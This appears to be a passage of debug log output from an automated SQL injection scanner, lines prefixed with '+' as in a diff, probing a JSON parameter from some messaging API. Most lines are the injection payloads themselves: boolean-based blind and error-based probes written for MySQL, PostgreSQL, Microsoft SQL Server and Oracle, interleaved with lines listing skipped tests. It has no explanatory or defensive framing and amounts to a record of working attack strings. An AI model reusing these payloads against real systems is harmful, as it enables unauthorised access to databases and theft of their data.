+[16:23:50] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 7081=7081
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 9826=6309 AND ('kzIK'='kzIK
+
+[16:23:50] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 7081=7081 AND ('bnDI'='bnDI
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 9763=7816 AND 'YQSe'='YQSe
+
+[16:23:50] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 7081=7081 AND 'QsKs'='QsKs
+
+[16:23:50] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 2912=1437-- fRxG
+
+[16:23:51] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 7081=7081-- pFRP
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (comment)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
+
+[16:23:51] [PAYLOAD] (SELECT (CASE WHEN (2570=1686) THEN '[{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' ELSE (SELECT 1686 UNION SELECT 3174) END))
+
+[16:23:51] [DEBUG] setting match ratio for current parameter to 0.949
+
+[16:23:51] [PAYLOAD] (SELECT (CASE WHEN (5899=5899) THEN '[{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' ELSE (SELECT 7412 UNION SELECT 3676) END))
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (ELT - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL boolean-based blind - Parameter replace (bool*int - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Informix boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Parameter replace (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (DUAL - original value)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Boolean-based blind - Parameter replace (CASE - original value)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 boolean-based blind - ORDER BY clause (original value)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'HAVING boolean-based blind - WHERE, GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL < 5.0 boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle boolean-based blind - Stacked queries' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft Access boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'SAP MaxDB boolean-based blind - Stacked queries' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND EXTRACTVALUE(3142,CONCAT(0x5c,0x7178767871,(SELECT (ELT(3142=3142,1))),0x7170767071)) AND (8404=8404
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND EXTRACTVALUE(3142,CONCAT(0x5c,0x7178767871,(SELECT (ELT(3142=3142,1))),0x7170767071))
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND EXTRACTVALUE(3142,CONCAT(0x5c,0x7178767871,(SELECT (ELT(3142=3142,1))),0x7170767071)) AND ('IAKB'='IAKB
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND EXTRACTVALUE(3142,CONCAT(0x5c,0x7178767871,(SELECT (ELT(3142=3142,1))),0x7170767071)) AND 'DCNA'='DCNA
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND EXTRACTVALUE(3142,CONCAT(0x5c,0x7178767871,(SELECT (ELT(3142=3142,1))),0x7170767071))-- XxBp
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 5650=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (5650=5650) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND (8639=8639
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 5650=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (5650=5650) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 5650=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (5650=5650) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND ('fYma'='fYma
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 5650=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (5650=5650) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC) AND 'HMVH'='HMVH
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 5650=CAST((CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113))||(SELECT (CASE WHEN (5650=5650) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)) AS NUMERIC)-- QqQP
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 3936 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3936=3936) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND (6788=6788
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 3936 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3936=3936) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113)))
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 3936 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3936=3936) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND ('iPNW'='iPNW
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 3936 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3936=3936) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113))) AND 'NaGR'='NaGR
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 3936 IN (SELECT (CHAR(113)+CHAR(120)+CHAR(118)+CHAR(120)+CHAR(113)+(SELECT (CASE WHEN (3936=3936) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(118)+CHAR(112)+CHAR(113)))-- Bldu
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (IN)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONVERT)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONVERT)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (CONCAT)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase OR error-based - WHERE or HAVING clause (CONCAT)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]) AND 5771=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (5771=5771) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND (6481=6481
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 5771=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (5771=5771) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]') AND 5771=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (5771=5771) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND ('obXg'='obXg
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}]' AND 5771=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (5771=5771) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL) AND 'ebvA'='ebvA
+
+[16:23:51] [PAYLOAD] [{"biz_id":1212,"time":1712564515,"type":1000,"code":0,"apiname":"PCMsgChannel","message":"onPCMsgChannel:ok","cost":174}] AND 5771=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(120)||CHR(118)||CHR(120)||CHR(113)||(SELECT (CASE WHEN (5771=5771) THEN 1 ELSE 0 END) FROM DUAL)||CHR(113)||CHR(112)||CHR(118)||CHR(112)||CHR(113)||CHR(62))) FROM DUAL)-- dNjq
+
+[16:23:51] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (XMLType)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (UTL_INADDR.GET_HOST_ADDRESS)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle AND error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Oracle OR error-based - WHERE or HAVING clause (DBMS_UTILITY.SQLID_TO_SQLHASH)' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Firebird AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Firebird OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MonetDB AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MonetDB OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Vertica AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Vertica OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 AND error-based - WHERE or HAVING clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'IBM DB2 OR error-based - WHERE or HAVING clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'ClickHouse AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the level (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'ClickHouse OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause' because the risk (3) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.5 error-based - Parameter replace (EXP)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.6 error-based - Parameter replace (GTID_SUBSET)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)' because the level (4) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace' because the level (2) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'PostgreSQL error-based - Parameter replace (GENERATE_SERIES)' because the level (5) is higher than the provided (1)
+
+[16:23:51] [DEBUG] skipping test 'Microsoft SQL Server/Sybase error-based - Parameter replace' because the level (3) is higher than the provided (1)
+
